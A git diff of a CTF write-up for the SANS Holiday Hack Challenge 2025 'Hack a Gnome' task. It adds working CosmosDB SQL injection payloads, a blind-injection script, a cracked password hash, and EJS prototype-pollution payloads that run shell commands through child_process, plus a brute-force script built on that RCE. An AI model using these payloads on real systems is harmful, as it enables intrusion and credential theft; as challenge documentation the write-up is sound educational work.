@@ -58,114 +58,70 @@ Difficulty: :material-star::material-star::material-star::material-star-outline:
 
 ## Solution
 
+There are multiple stages we need to go through to solve this challenge.
+
 ### Login
 
-Get a login prompt. Enumerating usernames using wordlists and ffuf didn't work.
-Putting a `"` in the username field generates an error:
+We get a login prompt when going to the webpage.
 
-```
-Error: An error occurred while checking username: Message: {"errors":[{"severity":"Error","location":{"start":44,"end":45},"code":"SC1012","message":"Syntax error, invalid string literal token '\"'."}]} ActivityId: 27cab604-4a72-4736-9d48-3ebaa577a5a4, Microsoft.Azure.Documents.Common/2.14.0
-```
+![answer](../media/hack_a_gnome/hack_a_gnome_1)
+/// caption
+Login prompt.
+///
 
-It appears to be using Azure DocumentDB/CosmosDB.
+#### Username Enumeration
 
-```
+The `Create Account` page allows us to enumerate usernames as it instantly provides feedback on whether a username is still available. We can query common English names:
+
+```title="Enumerate usernames using ffuf"
 ffuf -w ./malenames-usa-top1000.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ -fs 18
 HAROLD                  [Status: 200, Size: 19, Words: 1, Lines: 1]
 BRUCE                   [Status: 200, Size: 19, Words: 1, Lines: 1]
 ```
 
-??? success "Solution to question 1"
+We now know that two accounts exist with `HAROLD` and `BRUCE` as username.
+
+#### SQL Injection
+
+Putting a `"` in the username field on the `Create Account` page generates an error:
 
 ```
-try to enumerate usernames using wordlists and ffuf didn't work
-enumeration does seem allowed though
-ffuf -w ./names.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ
-
-" in username create account field generates error
-
 Error: An error occurred while checking username: Message: {"errors":[{"severity":"Error","location":{"start":44,"end":45},"code":"SC1012","message":"Syntax error, invalid string literal token '\"'."}]} ActivityId: 27cab604-4a72-4736-9d48-3ebaa577a5a4, Microsoft.Azure.Documents.Common/2.14.0
+```
 
-Using Azure DocumentDB / Cosmos DB
+We learn that the backend appears to be using Azure DocumentDB/CosmosDB and that it is injectable.
 
-ffuf -w ./malenames-usa-top1000.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ -fs 18
-HAROLD                  [Status: 200, Size: 19, Words: 1, Lines: 1]
-BRUCE                   [Status: 200, Size: 19, Words: 1, Lines: 1]
+We can leverage the [IS_DEFINED()](https://learn.microsoft.com/en-us/cosmos-db/query/is-defined) function of Microsoft CosmosDB to find the password hash of a user object in the database. CosmosDB queries frequently use `c` as document alias and have `id` as a key. We can test this as follows using `IS_DEFINED()`:
 
-use IS_DEFINED
-https://learn.microsoft.com/en-us/cosmos-db/query/is-defined
-c is an alias for each document in the container.
+```
+# Try 'id' as key
+" OR IS_DEFINED(c.id) --
 
+# Try 'digest' as key
+" OR IS_DEFINED(c.digest) --
+```
+
+This returns `Username is taken` for both, which indicates it returned `TRUE` meaning the alias and keys exist. The `digest` will contain the password hash we are looking for.
+
+Therefore, the backend query must look something like this:
+
+```
 SELECT IIF(COUNT(1) = 0, true, false) AS available
 FROM c
 WHERE c.username = "<username>"
-
-injection
-" OR IS_DEFINED(c.id) --
-
-'Username is taken' == value is defined
-
-" OR IS_DEFINED(c.digest) --
-
-to find hash
-" OR STARTSWITH(c.digest, "d") --
-
-Cosmos DB SQL API does not support UNION or UNION ALL. The syntax error is expected. Only a single SELECT statement is allowed per query.
-
-
-
-https://crackstation.net/
-pass = oatmeal12, user seems to be bruce
 ```
 
-### Prototype Pollution
+!!! example "AI usage"
 
-```
+    ChatGPT was used to learn more about the SQL query potentially in use in the backend, what alias is typically used when querying values CosmosDB, and what key names could be used to save a password hash.
 
-https://portswigger.net/web-security/prototype-pollution
-https://github.com/KTH-LangSec/server-side-prototype-pollution
+We can leverage scripting to brute-force our way to the password by using the function `STARTSWITH()` and testing different character sequences. This is similar to the trick used in the HHC 2024 challenge [Deactivate Frostbit Naughty-Nice List Publication](https://tominthebytes.github.io/SANS-HHC-2024/act_3/deactivate/?h=script#injection).
 
-updating key __proto__ works, while other random keys don't, so it is setting something
+??? note "Python SQL injection script to find password hash"
 
-Gemini Pro 3 preview of good help
+    This script will try all characters until the `STARTSWITH()` functions returns `TRUE`. If `TRUE`, then it saves that character and looks for the next one in the sequence.
 
-{
-  "action": "update",
-  "key": "__proto__",
-  "subkey": "outputFunctionName",
-  "value": "x;return 'POLLUTED_PAGE';//"
-}
-
-{
-  "action": "update",
-  "key": "__proto__",
-  "subkey": "outputFunctionName",
-  "value": "x;return global.process.mainModule.require('child_process').execSync('ls').toString(); //"
-}
-
-%7B%0A%20%20%22action%22:%20%22update%22,%0A%20%20%22key%22:%20%22__proto__%22,%0A%20%20%22subkey%22:%20%22outputFunctionName%22,%0A%20%20%22value%22:%20%22x;return%20global.process.mainModule.require('child_process').execSync('ls').toString();%20//%22%0A%7D
-
-README.md canbus_client.py node_modules package-lock.json package.json server.js views
-
-timeout 10 tcpdump -i gcan0 -A > /app/output.txt
-
-nohup python3 canbus_client.py listen >output.txt 2>&1 &
-
-sed -i \"s/0x656/0x700/g\" canbus_client_test.py
-
-0x201
-0x202
-0x203
-0x204
-
-```
-
-??? note "AI usage"
-AI used for exploring typical SQL queries and tables for functionality like this, and for password property names (eventually found myself). also to modify script from last years HHC to find pass hash
-
-??? note "script"
-
-    ```python
+    ``` py linenums="1"
     import requests
     import string
 
@@ -217,13 +173,78 @@ AI used for exploring typical SQL queries and tables for functionality like this
         print("Starting boolean‑based probe...")
         output = run_probe()
         print("Result:", output)
+    ```
 
+!!! example "AI usage"
+
+    ChatGPT was used to adapt the injection script used for last year's HHC.
+
+??? success "Password"
+
+    The Python script will return the MD5 hash `d0a9ba00f80cbc56584ef245ffc56b9e`. Using [crackstation.net](https://crackstation.net/) we can decode this to the password `oatmeal12`. We test this password with both usernames (`BRUCE` and `HAROLD`) and find that it's the password of `BRUCE`.
+
+    ![answer](../media/hack_a_gnome/hack_a_gnome_2)
+    /// caption
+    Decoding password hash.
+    ///
+
+### Prototype Pollution
+
+After login we see the following:
+
+![answer](../media/hack_a_gnome/hack_a_gnome_3)
+/// caption
+Decoding password hash.
+///
+
+The `Gnome Statistics` window displays values for certain keys and the `Gnome Control Interface` window displays a robot in some sort of maze. We have movement controls but we get errors when we try to use them. We will need to fix this to move the robot around and get to the control panel in the upper left corner. We also have a button `Update Name` with which we can push changes to keys in the statistics object.
+
+The hints tell us we need to find a vulnerability that we can exploit using [prototype polution](https://portswigger.net/web-security/prototype-pollution).
+
+!!! example "AI usage"
+
+    Gemini Pro 3 helped navigating this part of the challenge and provided helpful suggestions.
+
+We will leverage the `Update Name` functionality to push values to the prototype JavaScript object. [This](https://github.com/mde/ejs/issues/451) GitHub issue inspired the subkey to pollute for RCE:
+
+```js title="Prototype pollution"
+{
+  "action": "update",
+  "key": "__proto__",
+  "subkey": "outputFunctionName",
+  "value": "x;return global.process.mainModule.require('child_process').execSync('ls').toString(); //"
+}
+```
+
+??? success "Prototype pollution request"
+
+    We send a request with this payload encoded in the URL as follows:
 
     ```
+    %7B%0A%20%20%22action%22:%20%22update%22,%0A%20%20%22key%22:%20%22__proto__%22,%0A%20%20%22subkey%22:%20%22outputFunctionName%22,%0A%20%20%22value%22:%20%22x;return%20global.process.mainModule.require('child_process').execSync('ls').toString();%20//%22%0A%7D
+    ```
+
+
+    ![answer](../media/hack_a_gnome/hack_a_gnome_burp)
+    /// caption
+    Burp request.
+    ///
+
+    This returns the following when refreshing the statistics page, proving that the exploit works:
+
+    ```
+    README.md canbus_client.py node_modules package-lock.json package.json server.js views
+    ```
+
+    We can now execute code remotely.
 
 ### CAN Bus
 
+The last step we need to execute is to fix the controls of the robot. Using the RCE exploit in the last step we can learn more about the files on the server:
+
 ??? note "README.md"
+
+    This file displays the different CAN IDs in use and indicates that more signals related to controller the robot's movement still have to be implemented.
 
     ``` md title="README.md" linenums="1"
     # 🎄 GnomeBot CAN Bus Protocol - Top Secret Workshop Edition!
@@ -278,6 +299,8 @@ AI used for exploring typical SQL queries and tables for functionality like this
     ```
 
 ??? note "canbus_client.py"
+
+    This file contains the logic to listen to the CAN bus and send commands. It contains the faulty commands to move the robot; these must be replaced with the correct IDs. There is also `listen` functionality to understand what is being sent over the CAN bus but it didn't provide us with relevant information.
 
     ``` python title="canbus_client.py" linenums="1"
     #!/usr/bin/python3
@@ -377,7 +400,13 @@ AI used for exploring typical SQL queries and tables for functionality like this
         main()
     ```
 
-??? note "server.js (formatted by ChatGPT)"
+??? note "server.js"
+
+    This file contains the logic used to drive the wegpage.
+
+    !!! example "AI usage"
+
+        Script was formatted by ChatGPT.
 
     ```js title="server.js" linenums="1"
     require("dotenv").config();
@@ -485,7 +514,7 @@ AI used for exploring typical SQL queries and tables for functionality like this
         value: "Holiday remote controlled gnome for your home.",
         },
         { name: "status", value: "active" },
-        { name: "last_updated", value: new Date().toISOString() },
+        { name: "last_updated", value: new Date().toISOString() },new
         { name: "last_updated_by", value: containerUsername },
         { name: "last_accessed_by", value: containerUsername },
         {
@@ -658,6 +687,128 @@ AI used for exploring typical SQL queries and tables for functionality like this
     console.log(`Server (HTTP only) running on port ${PORT}`);
     });
     ```
+
+One way to find the correct CAN IDs to move the robot is by brute forcing all options. We can replace the IDs in `canbus_client.py` using `sed`:
+
+```
+sed -i \"s/0x656/0x700/g\" canbus_client_test.py
+```
+
+We generate a Python script that replaces the CAN ID of one of the movement actions using prototype pollution and attempts to move the robot to see if it returns success. It makes sure to copy the original version of the script first to limit breaking the webapp and make replacing the correct value easier.
+
+!!! example "AI usage"
+
+    Gemini Pro 3 was used to generate this script.
+
+??? note "Python brute force script"
+
+    ``` py linenums="1"
+    #!/usr/bin/env python3
+    import requests
+    import urllib.parse
+
+    # Base URL and headers
+    BASE_URL = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals"
+    HEADERS = {
+        "Host": "hhc25-smartgnomehack-prod.holidayhackchallenge.com",
+        "Cookie": "connect.sid=s%3Ar6TrKtH1WpRIbFfK2Ty8sVh9A9ivJs-h.d3CdBPNL%2F0HWxFlPph3R7LzzFV3qcKd22qBAGBJI%2B4Q",
+        "Accept": "*/*"
+    }
+
+    # Command template with placeholder
+    COMMAND_TEMPLATE = """{
+    "action": "update",
+    "key": "__proto__",
+    "subkey": "outputFunctionName",
+    "value": "x;return global.process.mainModule.require('child_process').execSync('sed -i \\"s/0x656/REPLACE_HEX/g\\" canbus_client.py').toString(); //"
+    }"""
+
+    COMMAND_COPY = """{
+    "action": "update",
+    "key": "__proto__",
+    "subkey": "outputFunctionName",
+    "value": "x;return global.process.mainModule.require('child_process').execSync('cp canbus_client_copy.py canbus_client.py').toString(); //"
+    }"""
+
+    COMMAND_SETUP = """{
+    "action": "update",
+    "key": "__proto__",
+    "subkey": "outputFunctionName",
+    "value": "x;return global.process.mainModule.require('child_process').execSync('cp canbus_client.py canbus_client_copy.py').toString(); //"
+    }"""
+
+    COMMAND_BACKUP = """{
+    "action": "update",
+    "key": "__proto__",
+    "subkey": "outputFunctionName",
+    "value": "x;return global.process.mainModule.require('child_process').execSync('cp canbus_client.py canbus_client_backup.py').toString(); //"
+    }"""
+
+    COMMAND_TRY = """{"action":"move","direction":"up"}"""
+
+    # Setup
+    encoded_command = urllib.parse.quote(COMMAND_SETUP)
+    # Send the control signal
+    resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
+    print(f"Copied python file, status: {resp.status_code}")
+    watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)
+
+    encoded_command = urllib.parse.quote(COMMAND_BACKUP)
+    # Send the control signal
+    resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
+    print(f"Copied python file, status: {resp.status_code}")
+    watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)
+
+    # Loop over hex values 0x000 to 0x999
+    for n in range(0x100, 0x99A):
+        # Copy python script for fresh version
+        encoded_command = urllib.parse.quote(COMMAND_COPY)
+        # Send the control signal
+        resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
+        print(f"Copied python file, status: {resp.status_code}")
+        watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)
+
+        # Change hex value for 'up'
+        hexval = f"0x{n:03x}"
+        command = COMMAND_TEMPLATE.replace("REPLACE_HEX", hexval)
+        encoded_command = urllib.parse.quote(command)
+        # Send the control signal
+        resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
+        print(f"Sent {hexval}, status: {resp.status_code}")
+        watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)
+
+        # Try 'up' command
+        encoded_command = urllib.parse.quote(COMMAND_TRY)
+        resp = requests.get(f"{BASE_URL}?message={encoded_command}", headers=HEADERS)
+        print(f"Tried 'up' command, status: {resp.status_code}")
+        watch_resp = requests.get("https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats", headers=HEADERS)
+        print(f"Watching output, length: {len(watch_resp.text)}")
+        print(resp)
+    ```
+
+??? success "CAN IDs"
+
+    Using the script, we find the following CAN IDs for moving the robot:
+
+    ```
+    0x201
+    0x202
+    0x203
+    0x204
+    ```
+
+### Maze
+
+The final step involves moving the robot through the maze with boxes. We can push boxes forward to create a path.
+
+??? success "Maze"
+
+    We can create the following path to get to the control box and solve the challenge:
+
+    ![answer](../media/hack_a_gnome/hack_a_gnome_done)
+    /// caption
+    Path through maze.
+    ///
 
 ## Response
 
